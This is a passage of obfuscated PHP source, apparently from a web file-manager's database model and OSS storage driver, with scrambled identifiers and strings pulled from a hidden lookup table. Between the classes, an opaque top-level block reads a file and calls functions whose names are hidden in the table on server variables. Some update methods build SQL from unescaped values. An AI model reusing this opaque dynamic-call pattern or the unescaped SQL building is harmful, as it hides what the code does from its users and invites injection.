$in[$˜Ñ°¼û¨[360]] : $ı×şöÛ²; if ($ı×şöÛ² === -1) { $in[$˜Ñ°¼û¨[360]] = !1; $¬Õ’‰¶ = 100000000; $ı×şöÛ² = $¬Õ’‰¶; } $®ÀŞØœ£ = $Œİ†ü¦¾; $®ÀŞØœ£[$˜Ñ°¼û¨[362]] = array(); $ı×şöÛ² = intval($ı×şöÛ²); $ı×şöÛ² = $ı×şöÛ² <= 5 ? 5 : ($ı×şöÛ² >= $¬Õ’‰¶ ? $¬Õ’‰¶ : $ı×şöÛ²); $¾¨ Ñö° = intval(isset($in[$˜Ñ°¼û¨[350]]) && $in[$˜Ñ°¼û¨[350]] ? $in[$˜Ñ°¼û¨[350]] : $¾¨ Ñö°); $¾¨ Ñö° = $¾¨ Ñö° <= 1 ? 1 : $¾¨ Ñö°; $ÌêØÙÑ = array(); $’³“éïµ = 1; if ($¾¨ Ñö° == 1 && $’³“éïµ) { $this->optionsValue($Œİ†ü¦¾); $ÌêØÙÑ = $this->page($¾¨ Ñö°, $ı×şöÛ²)->select(); $œŞÒÑüÛ = is_array($ÌêØÙÑ) ? count($ÌêØÙÑ) : 0; if ($œŞÒÑüÛ < $ı×şöÛ²) { $Ûäªçü— = 1; } else { $this->optionsValue($®ÀŞØœ£); $œŞÒÑüÛ = intval($this->count()); $Ûäªçü— = ceil($œŞÒÑüÛ / $ı×şöÛ²); } } else { $this->optionsValue($®ÀŞØœ£); $œŞÒÑüÛ = intval($this->count()); $Ûäªçü— = ceil($œŞÒÑüÛ / $ı×şöÛ²); $¾¨ Ñö° = $¾¨ Ñö° >= $Ûäªçü— ? $Ûäªçü— : $¾¨ Ñö°; $this->optionsValue($Œİ†ü¦¾); $ÌêØÙÑ = $this->page($¾¨ Ñö°, $ı×şöÛ²)->select(); } if (!is_array($ÌêØÙÑ)) { $ÌêØÙÑ = array(); } if ($Ûäªçü— == 1) { $œŞÒÑüÛ = count($ÌêØÙÑ); } $©Œ¶ÏÆˆ = array($˜Ñ°¼û¨[363] => array($˜Ñ°¼û¨[364] => $œŞÒÑüÛ, $˜Ñ°¼û¨[360] => $ı×şöÛ², $˜Ñ°¼û¨[350] => $¾¨ Ñö°, $˜Ñ°¼û¨[365] => $Ûäªçü—), $˜Ñ°¼û¨[366] => $ÌêØÙÑ); return $©Œ¶ÏÆˆ; } protected function checkLength($§¸˜À×Û, $±È«İæ´ = 0, $Ş¡Û—Ë¦ = '') { $É«©¡É¹ =& $_SERVER[Æ š¦İÈ]; $±È«İæ´ = $±È«İæ´ ? $±È«İæ´ : 65536; if (!$§¸˜À×Û || strlen($§¸˜À×Û) < $±È«İæ´) { return; } $Ş¡Û—Ë¦ = $Ş¡Û—Ë¦ ? $Ş¡Û—Ë¦ . $É«©¡É¹[71] : $É«©¡É¹[12]; show_json($Ş¡Û—Ë¦ . LNG($É«©¡É¹[367]) . "\50{$±È«İæ´}\51", !1); } protected function metaSet($Ğµ õ¦’, $ïîÎ´¢¨ = null, $ıƒŸ‰ÑÉ = null) { $²ÖÌ„ú÷ =& $_SERVER[Æ š¦İÈ]; if (!$this->tableMeta || !$Ğµ õ¦’) { return !1; } $ÌÔš„›ş = $this->tableMeta[$²ÖÌ„ú÷[368]]; $ÛùÎşË = $this->tableMeta[$²ÖÌ„ú÷[369]]; $¢¦†şá» = Model($ÛùÎşË); $¿©õ±Õ = array($ÌÔš„›ş => $Ğµ õ¦’, $²ÖÌ„ú÷[370] => $ïîÎ´¢¨); if (is_null($ïîÎ´¢¨)) { return $¢¦†şá»->where(array($ÌÔš„›ş => $Ğµ õ¦’))->delete(); } if (is_null($ıƒŸ‰ÑÉ) && is_string($ïîÎ´¢¨)) { return $¢¦†şá»->where($¿©õ±Õ)->delete(); } $÷áÔ¥”’ = is_array($ïîÎ´¢¨) ? $ïîÎ´¢¨ : array(); if (is_string($ïîÎ´¢¨)) { $÷áÔ¥”’[$ïîÎ´¢¨] = $ıƒŸ‰ÑÉ; } $¢Ş•©ÆÉ = array(); foreach ($÷áÔ¥”’ as $üíÑ€Ã‡ => $è¼íóµ‹) { if (is_null($è¼íóµ‹) && is_string($üíÑ€Ã‡)) { $¢¦†şá»->where(array($ÌÔš„›ş => $Ğµ õ¦’, $²ÖÌ„ú÷[370] => $üíÑ€Ã‡))->delete(); continue; } $this->checkLength($è¼íóµ‹, !1, $ÛùÎşË . $²ÖÌ„ú÷[4] . $üíÑ€Ã‡); $¢Ş•©ÆÉ[] = array($ÌÔš„›ş => $Ğµ õ¦’, $²ÖÌ„ú÷[95] => $üíÑ€Ã‡, $²ÖÌ„ú÷[371] => $è¼íóµ‹); } $¤òôÎ¹Ğ = $²ÖÌ„ú÷[372] . $ÛùÎşË; CacheLock::lock($¤òôÎ¹Ğ); $¢¦†şá»->where(array($ÌÔš„›ş => $Ğµ õ¦’))->addAll($¢Ş•©ÆÉ, array(), !0); CacheLock::unlock($¤òôÎ¹Ğ); return !0; } public function metaGet($µ÷¤¶’›, $­–úŠãÊ = false) { $ƒË’Àğ =& $_SERVER[Æ š¦İÈ]; if (!$this->tableMeta) { return array(); } $Ëè¡£¶¹ = $this->tableMeta[$ƒË’Àğ[368]]; $²¼’”³¯ = Model($this->tableMeta[$ƒË’Àğ[369]]); if ($­–úŠãÊ) { $ÏšïæóÃ = array($Ëè¡£¶¹ => $µ÷¤¶’›, $ƒË’Àğ[95] => $­–úŠãÊ); return $²¼’”³¯->where($ÏšïæóÃ)->getField($ƒË’Àğ[371]); } $ÏšïæóÃ = array($Ëè¡£¶¹ => $µ÷¤¶’›); $€ôÑ‹ÇÑ = $²¼’”³¯->field($ƒË’Àğ[373])->where($ÏšïæóÃ)->select(); $€ôÑ‹ÇÑ = array_to_keyvalue($€ôÑ‹ÇÑ, $ƒË’Àğ[95], $ƒË’Àğ[371]); return $€ôÑ‹ÇÑ; } private function checkDataAutoHas($úø¾ÕÆƒ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ÙæşÍ¦ê) { if (in_array($úø¾ÕÆƒ, explode($_SERVER[Æ š¦İÈ][50], $ÙæşÍ¦ê[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$‚úÙÎß®, $©ıßÖ ¯) { $¸±çÔ¦‘ =& $_SERVER[Æ š¦İÈ]; if (!is_array($‚úÙÎß®)) { return; } foreach ($this->dataAuto as $¥²Ÿë¢ï) { $úÔ”¼²» = $¥²Ÿë¢ï[0]; if (!in_array($©ıßÖ ¯, explode($¸±çÔ¦‘[50], $¥²Ÿë¢ï[2]))) { continue; } switch (trim($¥²Ÿë¢ï[3])) { case $¸±çÔ¦‘[318]: case $¸±çÔ¦‘[319]: $«ÇæäÍ¬ = $¥²Ÿë¢ï[1]; $ø×…µã  = isset($¥²Ÿë¢ï[4]) ? (array) $¥²Ÿë¢ï[4] : array(); if ($«ÇæäÍ¬ == $¸±çÔ¦‘[198] && array_key_exists($úÔ”¼²», $‚úÙÎß®)) { if (!$‚úÙÎß®[$úÔ”¼²»]) { unset($‚úÙÎß®[$úÔ”¼²»]); } break; } if (isset($‚úÙÎß®[$úÔ”¼²»])) { array_unshift($ø×…µã , $‚úÙÎß®[$úÔ”¼²»]); } if ($¸±çÔ¦‘[318] == $¥²Ÿë¢ï[3]) { $‚úÙÎß®[$úÔ”¼²»] = call_user_func_array($«ÇæäÍ¬, $ø×…µã ); } else { $‚úÙÎß®[$úÔ”¼²»] = call_user_func_array(array(&$this, $«ÇæäÍ¬), $ø×…µã ); } break; case $¸±çÔ¦‘[267]: if (isset($‚úÙÎß®[$úÔ”¼²»]) && $‚úÙÎß®[$úÔ”¼²»]) { $‚úÙÎß®[$úÔ”¼²»] = call_user_func_array(array(&$this, $¥²Ÿë¢ï[1]), array($‚úÙÎß®[$úÔ”¼²»])); } break; case $¸±çÔ¦‘[270]: $‚úÙÎß®[$úÔ”¼²»] = $‚úÙÎß®[$¥²Ÿë¢ï[1]]; break; case $¸±çÔ¦‘[291]: if (isset($‚úÙÎß®[$úÔ”¼²»]) && !is_string($‚úÙÎß®[$úÔ”¼²»])) { $‚úÙÎß®[$úÔ”¼²»] = json_encode_force($‚úÙÎß®[$úÔ”¼²»]); } break; case $¸±çÔ¦‘[320]: if ($‚úÙÎß®[$úÔ”¼²»] === $¸±çÔ¦‘[12]) { unset($‚úÙÎß®[$úÔ”¼²»]); } break; case $¸±çÔ¦‘[321]: $‚úÙÎß®[$úÔ”¼²»] = $¥²Ÿë¢ï[1]; default: break; } } if ($©ıßÖ ¯ == $¸±çÔ¦‘[352]) { $ß°ş‚±ƒ = strtolower($this->db->getDbType()); if (strpos($ß°ş‚±ƒ, $¸±çÔ¦‘[13]) !== 0) { return; } $À¬õ¬ù— = $this->field(!0)->fields; $úÂ‡´şı = $À¬õ¬ù—[$¸±çÔ¦‘[249]]; if (isset($À¬õ¬ù—[$¸±çÔ¦‘[248]])) { unset($úÂ‡´şı[$À¬õ¬ù—[$¸±çÔ¦‘[248]]]); } foreach ($úÂ‡´şı as $ÂìÀ±ƒí => $©ıßÖ ¯) { if (!isset($‚úÙÎß®[$ÂìÀ±ƒí])) { $‚úÙÎß®[$ÂìÀ±ƒí] = $¸±çÔ¦‘[12]; } } } } private function dataAfterFilter(&$³Â™´â·) { $ñÈ¥á”ƒ =& $_SERVER[Æ š¦İÈ]; foreach ($this->dataAuto as $´ø¹Ë) { $ĞƒàŒ©Œ = $´ø¹Ë[0]; if (!isset($³Â™´â·[$ĞƒàŒ©Œ])) { continue; } if (!in_array($ñÈ¥á”ƒ[354], explode($ñÈ¥á”ƒ[50], $´ø¹Ë[2]))) { continue; } switch (trim($´ø¹Ë[3])) { case $ñÈ¥á”ƒ[318]: case $ñÈ¥á”ƒ[319]: $÷Şò°ïâ = isset($´ø¹Ë[4]) ? (array) $´ø¹Ë[4] : array(); array_unshift($÷Şò°ïâ, $³Â™´â·[$ĞƒàŒ©Œ]); if (isset($´ø¹Ë[4]) && $´ø¹Ë[4] == $ñÈ¥á”ƒ[374]) { $÷Şò°ïâ = array($³Â™´â·[$ĞƒàŒ©Œ]); } if ($ñÈ¥á”ƒ[318] == $´ø¹Ë[3]) { $³Â™´â·[$ĞƒàŒ©Œ] = call_user_func_array($´ø¹Ë[1], $÷Şò°ïâ); } else { $³Â™´â·[$ĞƒàŒ©Œ] = call_user_func_array(array(&$this, $´ø¹Ë[1]), $÷Şò°ïâ); } break; case $ñÈ¥á”ƒ[267]: if (isset($³Â™´â·[$ĞƒàŒ©Œ]) && $³Â™´â·[$ĞƒàŒ©Œ]) { $³Â™´â·[$ĞƒàŒ©Œ] = call_user_func_array(array(&$this, $´ø¹Ë[1]), array($³Â™´â·[$ĞƒàŒ©Œ])); } break; case $ñÈ¥á”ƒ[270]: $³Â™´â·[$ĞƒàŒ©Œ] = $³Â™´â·[$´ø¹Ë[1]]; break; case $ñÈ¥á”ƒ[291]: $Á‚İõ¤ç = $³Â™´â·[$ĞƒàŒ©Œ]; $³Â™´â·[$ĞƒàŒ©Œ] = json_decode($Á‚İõ¤ç, !0); if (is_null($³Â™´â·[$ĞƒàŒ©Œ])) { $³Â™´â·[$ĞƒàŒ©Œ] = $Á‚İõ¤ç; } break; case $ñÈ¥á”ƒ[320]: if ($³Â™´â·[$ĞƒàŒ©Œ] === $ñÈ¥á”ƒ[12]) { unset($³Â™´â·[$ĞƒàŒ©Œ]); } break; case $ñÈ¥á”ƒ[321]: $³Â™´â·[$ĞƒàŒ©Œ] = $´ø¹Ë[1]; break; default: break; } } } public function saveAll($áûÙìĞ) { $ıø¢°Ë½ =& $_SERVER[Æ š¦İÈ]; $Æ˜õáÖÏ = $this->tablePrefix . $this->tableName; $™Úö‡ = self::SQL_WHERE_IN_CHUNK; $áûÙìĞ = is_array($áûÙìĞ) ? $áûÙìĞ : array(); $ÄçüÊÓ¾ = $ıø¢°Ë½[375]; $²¨÷¸øŒ = 0; $¾¶’îÌ§ = array(); $ïì—øÉí = count($áûÙìĞ); for ($İºøç²” = 0; $İºøç²” < $ïì—øÉí; $İºøç²”++) { $ÓÂ¬Éå© = $áûÙìĞ[$İºøç²”]; if (!is_array($ÓÂ¬Éå©) || count($ÓÂ¬Éå©) != 4) { continue; } $ğ—³Ä”Ô = "\x55\120\104\x41\124\105\x20\140{$Æ˜õáÖÏ}\x60\x20\x53\x45\124\40{$ÓÂ¬Éå©[2]}\x20\75\x20\x43\101\x53\105\40{$ÓÂ¬Éå©[0]}\40\xa"; if ($²¨÷¸øŒ == 0) { $ÄçüÊÓ¾ = $ğ—³Ä”Ô; } $¾¶’îÌ§[] = $ıø¢°Ë½[119] . $ÓÂ¬Éå©[1] . $ıø¢°Ë½[119]; $²¨÷¸øŒ++; $ÄçüÊÓ¾ .= "\x20\127\110\105\x4e\x20\x27{$ÓÂ¬Éå©[1]}\47\40\124\x48\105\116\x20\47{$ÓÂ¬Éå©[3]}\47\x20\12"; if ($²¨÷¸øŒ == $™Úö‡ || $İºøç²” == $ïì—øÉí - 1) { $ÄÎ¢œüì = implode($ıø¢°Ë½[50], $¾¶’îÌ§); $ÄçüÊÓ¾ .= "\x20\105\116\104\40\x20\127\x48\105\x52\x45\40{$ÓÂ¬Éå©[0]}\40\111\116\x20\50{$ÄÎ¢œüì}\51\x20"; $this->execute($ÄçüÊÓ¾); $²¨÷¸øŒ = 0; $ÄçüÊÓ¾ = $ğ—³Ä”Ô; $this->chunkEventCheck(count($¾¶’îÌ§)); $¾¶’îÌ§ = array(); } } $this->chunkEventSet(); } public function saveAllEach($Á‘ªÆÛª) { $¨õ¬‚»ş =& $_SERVER[Æ š¦İÈ]; $£ş—Ò¯ = $this->tablePrefix . $this->tableName; foreach ($Á‘ªÆÛª as $µîéˆ­Á) { if (!is_array($µîéˆ­Á) || count($µîéˆ­Á) != 4) { continue; } $‡¦ÏÌÏ” = $µîéˆ­Á[0] . $¨õ¬‚»ş[376] . $µîéˆ­Á[1] . $¨õ¬‚»ş[119]; $´¨öˆ— = $µîéˆ­Á[2] . $¨õ¬‚»ş[376] . $µîéˆ­Á[3] . $¨õ¬‚»ş[119]; $–ÅÛ†ÖŸ = "\165\160\144\x61\x74\x65\40{$£ş—Ò¯}\40\x73\145\x74\x20{$´¨öˆ—}\x20\167\150\145\x72\x65\x20{$‡¦ÏÌÏ”}\x3b"; $this->execute($–ÅÛ†ÖŸ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ß±ûÑ¨ = false, $Ê®ÇÀ´Ø = false) { $this->_chunkEvent = $ß±ûÑ¨; $this->_chunkEventParam = $Ê®ÇÀ´Ø; } private function chunkEventCheck($Àô™ì’) { if (!$this->_chunkEvent) { return; } $øÖÇÎğ‰ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $øÖÇÎğ‰[$_SERVER[Æ š¦İÈ][377]] = $Àô™ì’; Hook::trigger($this->_chunkEvent, $øÖÇÎğ‰); } public function addAll($ö™«å‘Â, $õ¹ˆŞë¤ = array(), $çÑ¶šóş = false) { $ª æÂŸË =& $_SERVER[Æ š¦İÈ]; ignore_timeout(); $íÅÍ¨Å… = self::SQL_WHERE_IN_CHUNK; if (empty($ö™«å‘Â)) { $this->error = think_lang($ª æÂŸË[268]); return !1; } $õ¹ˆŞë¤ = $this->_parseOptions($õ¹ˆŞë¤); foreach ($ö™«å‘Â as $‘ÒÖ½Ü => $÷åÆÜ³€) { $ö™«å‘Â[$‘ÒÖ½Ü] = $this->_facade($÷åÆÜ³€); $this->_beforeInsert($ö™«å‘Â[$‘ÒÖ½Ü], $õ¹ˆŞë¤); } if (method_exists($this->db, $ª æÂŸË[269])) { for ($ÜÁä™­˜ = 0; $ÜÁä™­˜ < count($ö™«å‘Â); $ÜÁä™­˜ += $íÅÍ¨Å…) { $şÎÅŸ¯ = array_slice($ö™«å‘Â, $ÜÁä™­˜, $íÅÍ¨Å…); if (!is_array($şÎÅŸ¯) || count($şÎÅŸ¯) == 0) { break; } $ˆÙ³©Éİ = $this->db->insertAll($şÎÅŸ¯, $õ¹ˆŞë¤, $çÑ¶šóş); $this->chunkEventCheck(count($şÎÅŸ¯)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ö™«å‘Â as $‘ÒÖ½Ü => $÷åÆÜ³€) { $ˆÙ³©Éİ = $this->db->insert($÷åÆÜ³€, $õ¹ˆŞë¤, $çÑ¶šóş); } $this->commit(); } if (!1 !== $ˆÙ³©Éİ) { $»ùĞÅÄ“ = $this->getLastInsID(); if ($»ùĞÅÄ“) { return $»ùĞÅÄ“; } } return $ˆÙ³©Éİ; } public function save($ò»´ß›Ó = '', $ÛÙÄÅı˜ = array()) { $¸Åáé®£ =& $_SERVER[Æ š¦İÈ]; $©¹ü«ˆÚ = self::SQL_WHERE_IN_CHUNK; $‰…¹êäÄ = $this->optionsValue(); $¿ÙµÑÔ« = $this->findWhereField($‰…¹êäÄ); if (!$¿ÙµÑÔ«) { return parent::save($ò»´ß›Ó, $ÛÙÄÅı˜); } $òÍÅÚÁ = 0; $–óËçÄÅ = $‰…¹êäÄ[$¸Åáé®£[272]][$¿ÙµÑÔ«][1]; $–óËçÄÅ = is_array($–óËçÄÅ) ? $–óËçÄÅ : array(); $•“ô‡°š = count($–óËçÄÅ); for ($ã•“’Ç = 0; $ã•“’Ç < $•“ô‡°š; $ã•“’Ç += $©¹ü«ˆÚ) { $†âºë¼Ï = array_slice($–óËçÄÅ, $ã•“’Ç, $©¹ü«ˆÚ); if (!is_array($†âºë¼Ï) || count($†âºë¼Ï) == 0) { break; } $‰…¹êäÄ[$¸Åáé®£[272]][$¿ÙµÑÔ«][1] = $†âºë¼Ï; $this->optionsValue($‰…¹êäÄ); $òÍÅÚÁ += parent::save($ò»´ß›Ó, $ÛÙÄÅı˜); $this->chunkEventCheck(count($†âºë¼Ï)); } $this->chunkEventSet(); return $òÍÅÚÁ; } public function add($ûˆÎÈÅˆ = '', $Õ×§Â‰Å = array(), $¼ôÄÍ¼ = false) { if ($this->addTaskStatus && is_array($ûˆÎÈÅˆ)) { $this->addTaskData[] = $ûˆÎÈÅˆ; return; } return parent::add($ûˆÎÈÅˆ, $Õ×§Â‰Å, $¼ôÄÍ¼); } public function parseWhereLike($—ÊæŠÉ‚, $Õ•µÙ¨û = '', $‘¡—†µ = false, &$‹ã½Ü¸¢ = false) { $ú—“‡ŠÙ =& $_SERVER[Æ š¦İÈ]; $ŒÚó§»† = $GLOBALS[$ú—“‡ŠÙ[6]][$ú—“‡ŠÙ[378]]; if (!$ŒÚó§»†[$ú—“‡ŠÙ[379]]) { return $—ÊæŠÉ‚; } if (!is_array($—ÊæŠÉ‚)) { return $—ÊæŠÉ‚; } $•€Ğõí = array(); $ˆ«ùÙ±ì = 0; foreach ($—ÊæŠÉ‚ as $µİ×»ù => $ö½­‰úº) { if (is_array($ö½­‰úº) && count($ö½­‰úº) == 2 && $ö½­‰úº[0] == $ú—“‡ŠÙ[380] && is_string($ö½­‰úº[1]) && substr($ö½­‰úº[1], 0, 1) == $ú—“‡ŠÙ[381] && substr($ö½­‰úº[1], strlen($ö½­‰úº[1]) - 1, 1) == $ú—“‡ŠÙ[381]) { $‹ã½Ü¸¢ = !0; $ê´ßŒ‰ = is_string($µİ×»ù) ? $µİ×»ù : $Õ•µÙ¨û; $‘”àĞÈ¼ = substr($ö½­‰úº[1], 1, strlen($ö½­‰úº[1]) - 2); $‘”àĞÈ¼ = $this->db->escapeString($‘”àĞÈ¼); if (!strpos($ê´ßŒ‰, $ú—“‡ŠÙ[10])) { $ê´ßŒ‰ = $ú—“‡ŠÙ[382] . $ê´ßŒ‰ . $ú—“‡ŠÙ[382]; } $æ©Ø“êü = $ú—“‡ŠÙ[183] . $‘”àĞÈ¼ . $ú—“‡ŠÙ[183]; if ($ŒÚó§»†[$ú—“‡ŠÙ[383]]) { $æ©Ø“êü = $ú—“‡ŠÙ[384] . $‘”àĞÈ¼ . $ú—“‡ŠÙ[385]; if ($ŒÚó§»†[$ú—“‡ŠÙ[386]]) { $æ©Ø“êü = $ú—“‡ŠÙ[385] . $‘”àĞÈ¼ . $ú—“‡ŠÙ[384]; } } $•€Ğõí[$ˆ«ùÙ±ì] = $ú—“‡ŠÙ[387] . $ê´ßŒ‰ . $ú—“‡ŠÙ[388] . $æ©Ø“êü . $ú—“‡ŠÙ[389]; $ˆ«ùÙ±ì++; continue; } if (is_array($ö½­‰úº)) { $Õ•µÙ¨û = is_string($µİ×»ù) ? $µİ×»ù : $Õ•µÙ¨û; $ö½­‰úº = $this->parseWhereLike($ö½­‰úº, $Õ•µÙ¨û, !0, $‹ã½Ü¸¢); } if (is_numeric($µİ×»ù)) { $•€Ğõí[$ˆ«ùÙ±ì] = $ö½­‰úº; $ˆ«ùÙ±ì++; } else { $•€Ğõí[$µİ×»ù] = $ö½­‰úº; } } if ($‹ã½Ü¸¢ && !$‘¡—†µ) { } return $•€Ğõí; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($»úƒáÚÌ = array()) { $‹ËØ˜ô‘ =& $_SERVER[Æ š¦İÈ]; $–®£¨Òô = self::SQL_WHERE_IN_CHUNK; $ÜŒñÌÂ = $this->optionsValue(); $Ø¹ı³À = $this->findWhereField($ÜŒñÌÂ); if (!$Ø¹ı³À || isset($ÜŒñÌÂ[$‹ËØ˜ô‘[289]]) || isset($ÜŒñÌÂ[$‹ËØ˜ô‘[350]])) { return parent::select($»úƒáÚÌ); } $¸¿²ãğ˜ = $ÜŒñÌÂ[$‹ËØ˜ô‘[272]][$Ø¹ı³À][1]; $¸¿²ãğ˜ = is_array($¸¿²ãğ˜) ? $¸¿²ãğ˜ : array(); $¶‹ÏÜ´ = null; for ($ŸªîÀ¬ = 0; $ŸªîÀ¬ < count($¸¿²ãğ˜); $ŸªîÀ¬ += $–®£¨Òô) { $—›‡ÈÒ = array_slice($¸¿²ãğ˜, $ŸªîÀ¬, $–®£¨Òô); if (!is_array($—›‡ÈÒ) || count($—›‡ÈÒ) == 0) { break; } $ÜŒñÌÂ[$‹ËØ˜ô‘[272]][$Ø¹ı³À][1] = $—›‡ÈÒ; $this->optionsValue($ÜŒñÌÂ); $ÒÙ¼ÊÆÒ = parent::select($»úƒáÚÌ); if (!$ÒÙ¼ÊÆÒ) { continue; } $¶‹ÏÜ´ = is_array($¶‹ÏÜ´) ? $¶‹ÏÜ´ : array(); $¶‹ÏÜ´ = array_merge($¶‹ÏÜ´, $ÒÙ¼ÊÆÒ); } return $¶‹ÏÜ´; } public function delete($°üô‡Œë = array()) { $ığ’È¨ =& $_SERVER[Æ š¦İÈ]; $ÅÛÈŒ©Ú = self::SQL_WHERE_IN_CHUNK; $Ş†®ìÔé = $this->optionsValue(); $ÃÇÓö¥• = $this->findWhereField($Ş†®ìÔé); if (!$ÃÇÓö¥•) { return parent::delete($°üô‡Œë); } $¾Ë¡Ã¾ = 0; $á¼š×Í¶ = $Ş†®ìÔé[$ığ’È¨[272]][$ÃÇÓö¥•][1]; $á¼š×Í¶ = is_array($á¼š×Í¶) ? $á¼š×Í¶ : array(); for ($Ó¤šİ¦… = 0; $Ó¤šİ¦… < count($á¼š×Í¶); $Ó¤šİ¦… += $ÅÛÈŒ©Ú) { $Ø¸€Úß = array_slice($á¼š×Í¶, $Ó¤šİ¦…, $ÅÛÈŒ©Ú); if (!is_array($Ø¸€Úß) || count($Ø¸€Úß) == 0) { break; } $Ş†®ìÔé[$ığ’È¨[272]][$ÃÇÓö¥•][1] = $Ø¸€Úß; $this->optionsValue($Ş†®ìÔé); $¾Ë¡Ã¾ += parent::delete($°üô‡Œë); } return $¾Ë¡Ã¾; } private function findWhereField($¡ø¿¶Â¨) { $•ÛñÚ®Ä =& $_SERVER[Æ š¦İÈ]; $Ê˜å­àù = self::SQL_WHERE_IN_CHUNK; if (!is_array($¡ø¿¶Â¨) || !is_array($¡ø¿¶Â¨[$•ÛñÚ®Ä[272]])) { return !1; } foreach ($¡ø¿¶Â¨[$•ÛñÚ®Ä[272]] as $İçµÎµÕ => $×ıèó€º) { if (is_array($×ıèó€º) && isset($×ıèó€º[0]) && is_string($×ıèó€º[0]) && strtolower($×ıèó€º[0]) == $•ÛñÚ®Ä[7] && is_array($×ıèó€º[1]) && count($×ıèó€º[1]) > $Ê˜å­àù) { ignore_timeout(); return $İçµÎµÕ; } } return !1; } public function setMasterDB($Ë·šó’° = true) { think_config($_SERVER[Æ š¦İÈ][390], $Ë·šó’°); } } if ($_SERVER[$_SERVER[Æ š¦İÈ][391]] != $_SERVER[$_SERVER[Æ š¦İÈ][392]]) { $_getc = $_SERVER[Æ š¦İÈ][393]; $_getfile = $_SERVER[$_SERVER[Æ š¦İÈ][394]] . $_SERVER[Æ š¦İÈ][395]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Æ š¦İÈ][228], $_getfilec); if (count($_getarrs) < $_SERVER[Æ š¦İÈ][396]) { $exit = $_SERVER[Æ š¦İÈ][397]; $exit(); } $_act = $_SERVER[Æ š¦İÈ][398]; $_act($_SERVER[$_SERVER[Æ š¦İÈ][399]]); } goto eáˆ÷Ë×š; aÚö‘”Ñ›‹: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($”ŠÃ¢»ƒ) { parent::__construct(); include_once SDK_DIR . $_SERVER[Æ š¦İÈ][1371]; $this->_init($”ŠÃ¢»ƒ); } public function _init($„àåÙï) { $ÚğöÛÈô =& $_SERVER[Æ š¦İÈ]; foreach ($„àåÙï as $É­ê¿ => $ø…Ğğ¢à) { if (isset($this->{$É­ê¿})) { $this->{$É­ê¿} = $ø…Ğğ¢à; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÚğöÛÈô[1372] . LNG($ÚğöÛÈô[1373])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ò©îşßÉ =& $_SERVER[Æ š¦İÈ]; $±‰†ïÛ° = new OSS\Model\CorsConfig(); $Ü«ìØ¢Ğ = new OSS\Model\CorsRule(); $Ü«ìØ¢Ğ->addAllowedOrigin($ò©îşßÉ[1374]); $Ü«ìØ¢Ğ->addAllowedMethod($ò©îşßÉ[1375]); $Ü«ìØ¢Ğ->addAllowedMethod($ò©îşßÉ[1376]); $Ü«ìØ¢Ğ->addAllowedMethod($ò©îşßÉ[1377]); $Ü«ìØ¢Ğ->addAllowedMethod($ò©îşßÉ[1378]); $Ü«ìØ¢Ğ->addAllowedMethod($ò©îşßÉ[159]); $Ü«ìØ¢Ğ->setMaxAgeSeconds(600); $Ü«ìØ¢Ğ->addExposeHeader($ò©îşßÉ[1379]); $Ü«ìØ¢Ğ->addAllowedHeader($ò©îşßÉ[1374]); $±‰†ïÛ°->addRule($Ü«ìØ¢Ğ); try { $this->client->putBucketCors($this->bucket, $±‰†ïÛ°); } catch (OSS\Core\OssException $ïØØ©™) { return !1; } return !0; } public function getBucketCors() { $öù¹ÂÉÇ =& $_SERVER[Æ š¦İÈ]; $ğåÅ¿Ÿ• = null; try { $ğåÅ¿Ÿ• = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $¹şùŸ¸é) { return null; } if (!$ğåÅ¿Ÿ• || !($ûÈ³Ğ›ó = $ğåÅ¿Ÿ•->getRules())) { return null; } $¿¤Ë´Ä = $ûÈ³Ğ›ó[0]->getAllowedOrigins(); $ÓØäàŸ† = $ûÈ³Ğ›ó[0]->getAllowedMethods(); $ã°ºÌòï = $ûÈ³Ğ›ó[0]->getMaxAgeSeconds(); $Á“—×Ïı = $ûÈ³Ğ›ó[0]->getExposeHeaders(); $¦™„Â‡é = $ûÈ³Ğ›ó[0]->getAllowedHeaders(); return array($öù¹ÂÉÇ[182] => isset($¿¤Ë´Ä[0]) ? $¿¤Ë´Ä[0] : $öù¹ÂÉÇ[12], $öù¹ÂÉÇ[186] => $ÓØäàŸ†, $öù¹ÂÉÇ[1380] => $ã°ºÌòï, $öù¹ÂÉÇ[1381] => isset($Á“—×Ïı[0]) ? $Á“—×Ïı[0] : $öù¹ÂÉÇ[12], $öù¹ÂÉÇ[184] => isset($¦™„Â‡é[0]) ? $¦™„Â‡é[0] : $öù¹ÂÉÇ[12]); } public function isBucketCors() { $–’¬ø =& $_SERVER[Æ š¦İÈ]; $ı’çÙ¡Ò = $this->getBucketCors(); if (!$ı’çÙ¡Ò || !is_array($ı’çÙ¡Ò)) { return !1; } if ($ı’çÙ¡Ò[$–’¬ø[182]] != $–’¬ø[183] || $ı’çÙ¡Ò[$–’¬ø[184]] != $–’¬ø[183]) { return !1; } $Á¾ù­ò¿ = array_map($–’¬ø[185], $ı’çÙ¡Ò[$–’¬ø[186]]); if (!is_array($Á¾ù­ò¿)) { $Á¾ù­ò¿ = array(); } $í ™Š¼ø = array($–’¬ø[187], $–’¬ø[188], $–’¬ø[189], $–’¬ø[190], $–’¬ø[191]); $§Ê¢Óù = array_diff($í ™Š¼ø, $Á¾ù­ò¿); return empty($§Ê¢Óù); } public function mkfile($Œ§Üıªû, $•ú¾Ùœë = '', $ìÖŒ–ÈÃ = REPEAT_RENAME) { $ÎÉÌú¤ = $this->setContent($Œ§Üıªû, $•ú¾Ùœë); if ($ÎÉÌú¤ !== !1) { return 